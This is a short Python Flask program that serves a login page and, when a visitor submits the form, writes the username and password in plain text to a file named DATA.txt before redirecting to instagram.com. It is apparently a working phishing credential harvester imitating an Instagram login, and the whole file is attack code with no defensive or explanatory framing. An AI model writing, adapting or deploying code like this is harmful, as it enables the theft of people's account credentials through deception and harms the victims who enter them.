from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login_post():
    username = request.form['username']
    password = request.form['password']

    # Write username and password to a text file
    if not os.path.exists('DATA.txt'):
        with open('DATA.txt','w') as file:
            pass
    
    with open('DATA.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")
        return redirect("https://instagram.com")
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
